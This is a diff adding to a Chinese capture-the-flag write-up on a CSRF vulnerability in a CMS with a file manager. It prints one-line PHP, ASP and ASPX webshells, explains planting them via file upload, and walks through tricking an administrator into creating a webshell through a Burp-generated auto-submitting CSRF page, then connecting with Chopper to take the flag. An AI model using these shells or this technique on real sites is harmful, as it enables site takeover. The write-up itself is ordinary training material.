@@ -49,13 +49,53 @@ http://ABC.xyz/index.php?id=12
 </html>
 ```
 
+### 0b011 一句话木马
 
+```php
+#php的一句话木马： 
+<?php @eval($_POST['PASS']);?>
+#asp
+<%eval request ("PASS")%>
+#aspx
+<%@ Page Language="Jscript"%> <%eval(Request.Item["PASS"],"unsafe");%>
+```
+
+利用**文件上传漏洞**，往目标网站中上传一句话木马，然后通过注入软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。`eval（）`函数表示括号内的语句字符串什么的全都当做代码执行。`$_POST['PASS']`表示服务器将从页面中获得PASS这个参数值。
 
 ## 0x01 复现过程
 
+1. 使用指纹识别后安装一个与靶场相同的cms 先在本地测试好了后再实战
 
+	![](https://nc0.cdn.zkaq.cn/md/5371/3072dc6f53be64dbaf9f6f01a08724cd_13009.png)
+2. 登录后可见此cms上有文件式管理器 
 
+	![](https://nc0.cdn.zkaq.cn/md/5371/5461e6b56bf77b58e28328b5a26a81b0_26357.png)
+3. 新建文件222.php 内容写一句话木马 此时打开burpsuite抓包
 
+	![](https://nc0.cdn.zkaq.cn/md/5371/3196e1bec5caa09d573db51a9673f65f_77947.png)
+4. 抓到的数据包里面没有token，极大概率存在csrf漏洞，此时我们使用burp中的Generate CSRF PoC功能，将生成好的html代码复制出来 新建一个HTML文件
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/3eb6e15285fa9517d7746ed027a5d4ae_69326.png)
+	![](https://nc0.cdn.zkaq.cn/md/5371/4f400143320907c480227a9aaa631052_38371.png)
+5. 让代码实现自动提交功能
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/37d03761dd864a1eed27be3d0abfb986_64386.png)
+6. 将csrf.html 拖到浏览器，此时文件式管理器自动生成一个222.php，本地测试成功
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/d151d504faf96df07929b38473fb80bf_83428.png)
+7. 实战和本地唯一的区别就是域名此时修改csrf.html里面的域名即可
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/56e75ec1632eb88b44bf7ebb013ee54e_11139.png)
+8. 将csrf.html通过反馈界面上传
+	![](https://nc0.cdn.zkaq.cn/md/5371/24394eeeae40d82b0d2cc7826dcb78a2_68569.png)
+
+9. 等待管理员访问我们刚才的提交的那个木马文件 访问了后先在链接后面加个phpinfo()探针验证一下 成功后就可以打开菜刀了
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/cd11ea8073cd9591b52387fff571258d_85909.png)
+	![](https://nc0.cdn.zkaq.cn/md/5371/1ecf814862f8dfe197394e9f14a4892d_86993.png)
+10. 将链接添加进去 后面填入8 点击添加 进入后拿到flag
+
+	![](https://nc0.cdn.zkaq.cn/md/5371/09bc35f363db10dbddebf146cbc7cca4_41913.png)
 
 ## 0x02 漏洞检测与防范
 
@@ -87,4 +127,5 @@ http://ABC.xyz/index.php?id=12
 
 ## 0x03 思考与要点
 
-1. 
+1. CSRF与XSS的区别：CSRF伪造请求,XSS为跨站脚本攻击,一个为通过被攻击者浏览器携带验证信息请求头访问网站获取信息,一个则是使用一个脚本攻击。
+2. CSRF的成因：Cookie不过期，没有进行进一步的验证用户信息，没有安全意识访问了恶意站点。
